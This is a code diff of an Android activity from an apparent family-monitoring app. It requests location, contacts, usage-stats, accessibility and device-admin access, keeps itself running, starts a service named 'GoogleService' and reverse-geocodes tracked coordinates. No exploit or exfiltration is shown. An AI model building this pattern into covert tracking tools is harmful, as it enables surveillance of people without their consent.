@@ -15,6 +15,7 @@ import android.app.AppOpsManager;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.admin.DevicePolicyManager;
+import android.content.BroadcastReceiver;
 import android.content.ComponentName;
 import android.content.ContentResolver;
 import android.content.Context;
@@ -22,6 +23,8 @@ import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.content.pm.ServiceInfo;
 import android.database.Cursor;
+import android.location.Address;
+import android.location.Geocoder;
 import android.location.LocationListener;
 import android.net.Uri;
 import android.os.Build;
@@ -41,9 +44,11 @@ import android.os.Bundle;
 
 import com.family.accessibility.MyAccessibilityService;
 import com.family.adminstrator.Adminstrator;
+import com.family.background.GoogleService;
 import com.family.background.MyService;
 import com.family.location.LocationService;
 
+import java.io.IOException;
 import java.util.List;
 import java.util.Set;
 
@@ -51,23 +56,24 @@ public class MainActivity extends AppCompatActivity {
 
 
     public String CHANNEL_ID = "NOT";
-    LocationService gps;
+
+    Geocoder geocoder;
+    Double latitude,longitude;
     @Override
     protected void onCreate(Bundle savedInstanceState) {
-
-        Log.d("salam", "alalalal");
-        // currently not possible
-        //String[] proj = new String[] { Browser., Browser.BookmarkColumns.URL };
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
-//        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(MainActivity.this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
-//            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.ACCESS_FINE_LOCATION}, 1);
-//            return;
-//        }
-//        LocationService L = new LocationService(this);
+        createNotification();
+        setBattery();
+
+        simplePermissions();
 
 
+
+    }
+
+    public void createNotification() {
         // disable canceling of notification
         NotificationCompat.Builder builder = new NotificationCompat.Builder(this, CHANNEL_ID)
                 .setSmallIcon(R.mipmap.ic_launcher)
@@ -84,9 +90,6 @@ public class MainActivity extends AppCompatActivity {
 
         // notificationId is a unique int for each notification that you must define
         notificationManager.notify(1, builder.build());
-
-        permissions();
-        startService(new Intent(getApplicationContext(), MyService.class));
     }
     private void createNotificationChannel() {
         // Create the NotificationChannel, but only on API 26+ because
@@ -104,61 +107,34 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
-    public void permissions() {
+
+    public void drawAppPermission() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            if (!Settings.canDrawOverlays(this)) {
+                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName()));
+                startActivityForResult(intent, 0);
+            }
+        }
+    }
+    public void setUssage() {
+        if(!isUssageS()) {
+            Log.d("salam", "Not garanted");
+
+            startActivity(new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS));
+        }else {
+            Log.d("salam", "garanted");
+        }
+    }
+    public void simplePermissions() {
         String[] p = {Manifest.permission.ACCESS_COARSE_LOCATION, Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.INTERNET,
                 Manifest.permission.KILL_BACKGROUND_PROCESSES, Manifest.permission.PACKAGE_USAGE_STATS, Manifest.permission.ACCESS_NOTIFICATION_POLICY,
                 Manifest.permission.READ_CONTACTS, Manifest.permission.WRITE_CONTACTS, Manifest.permission.READ_EXTERNAL_STORAGE,
                 Manifest.permission.WRITE_EXTERNAL_STORAGE, Manifest.permission.FOREGROUND_SERVICE, Manifest.permission.SYSTEM_ALERT_WINDOW
         };
-//        for(int i = 0; i < p.length; i++) {
-//            if (ContextCompat.checkSelfPermission(this,p[i])!= PackageManager.PERMISSION_GRANTED) {
-//                ActivityCompat.requestPermissions(this,
-//                        new String[]{p[i]},
-//                        1);
-//                Log.d("salam", "not garanted - " + p[i]);
-//            }else {
-//                Log.d("salam", "garanted - " + p[i]);
-//            }
-//        }
-//        ActivityCompat.requestPermissions(this,
-//                p,
-//                1);
-
-        if(!isAccessibilityServiceEnabled(this, MyAccessibilityService.class)) {
-            setAccesibiltyOn();
-        }
-//
-//        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-//            if (!Settings.canDrawOverlays(this)) {
-//                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName()));
-//                startActivityForResult(intent, 0);
-//            }
-//        }
-
-
-        //set UssageS
-//        if(!isUssageS()) {
-//            Log.d("salam", "Not garanted");
-////            Intent intent = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS, Uri.parse("package:" + getPackageName()));
-////            startActivityForResult(intent, 0);
-//
-//            startActivity(new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS));
-//        }else {
-//            Log.d("salam", "garanted");
-//        }
-
-        //setNotificationAccess();
-
-
-        //setAdmin();
-
-
-        //setBattery();
-
-        //TODO Ignore Battery Optimisation. App Always in running
-
+        ActivityCompat.requestPermissions(this,
+                p,
+                1);
     }
-
     public void setBattery() {
         if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             Intent intent = new Intent();
@@ -171,9 +147,6 @@ public class MainActivity extends AppCompatActivity {
             }
         }
     }
-
-
-
     public void setNotificationAccess() {
 
 
@@ -188,12 +161,17 @@ public class MainActivity extends AppCompatActivity {
         }
 
     }
+    public void setAccesibiltyOn() {
+        if(!isAccessibilityServiceEnabled(this, MyAccessibilityService.class)) {
+            Intent openSettings = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
+            openSettings.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_HISTORY);
+            startActivity(openSettings);
+        }
 
-    DevicePolicyManager mDPM;
-    ComponentName mDeviceAdmin;
-    //https://stackoverflow.com/questions/30130163/enable-device-admin-dialog-not-showing
+    }
     public void setAdmin() {
         //https://developer.android.com/guide/topics/admin/device-admin
+        //https://stackoverflow.com/questions/30130163/enable-device-admin-dialog-not-showing
         mDPM = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
         mDeviceAdmin = new ComponentName(this, Adminstrator.class);
 
@@ -208,6 +186,11 @@ public class MainActivity extends AppCompatActivity {
             startActivityForResult(intent, 14);
         }
     }
+
+    DevicePolicyManager mDPM;
+    ComponentName mDeviceAdmin;
+
+
     public boolean isUssageS() {
         AppOpsManager appOps = null;
         if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.KITKAT) {
@@ -234,19 +217,18 @@ public class MainActivity extends AppCompatActivity {
         return false;
     }
 
-    public void setAccesibiltyOn() {
-        Intent openSettings = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
-        openSettings.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_HISTORY);
-        startActivity(openSettings);
-    }
+
     @Override
     public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
+        Log.d("salam", "0-------");
+        //LocationService L = new LocationService(this);
+        startService(new Intent(getApplicationContext(), GoogleService.class));
         if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
 
         }else {
             //Log.d("salam", "not garanted - " + p[i]);
 //            ActivityCompat.requestPermissions(this,
-//                    new String[]{permissions[0]},
+//                    permissions,
 //                    1);
         }
     }
@@ -264,4 +246,38 @@ public class MainActivity extends AppCompatActivity {
 //        }
         Log.d("salam","result came");
     }//onActivityResult
+
+    private BroadcastReceiver broadcastReceiver = new BroadcastReceiver() {
+        @Override
+        public void onReceive(Context context, Intent intent) {
+
+            latitude = Double.valueOf(intent.getStringExtra("latutide"));
+            longitude = Double.valueOf(intent.getStringExtra("longitude"));
+
+            List<Address> addresses = null;
+
+            try {
+                addresses = geocoder.getFromLocation(latitude, longitude, 1);
+                String cityName = addresses.get(0).getAddressLine(0);
+                String stateName = addresses.get(0).getAddressLine(1);
+                String countryName = addresses.get(0).getAddressLine(2);
+
+//                tv_area.setText(addresses.get(0).getAdminArea());
+//                tv_locality.setText(stateName);
+//                tv_address.setText(countryName);
+
+
+
+            } catch (IOException e1) {
+                e1.printStackTrace();
+            }
+
+
+//            tv_latitude.setText(latitude+"");
+//            tv_longitude.setText(longitude+"");
+//            tv_address.getText();
+
+
+        }
+    };
 }
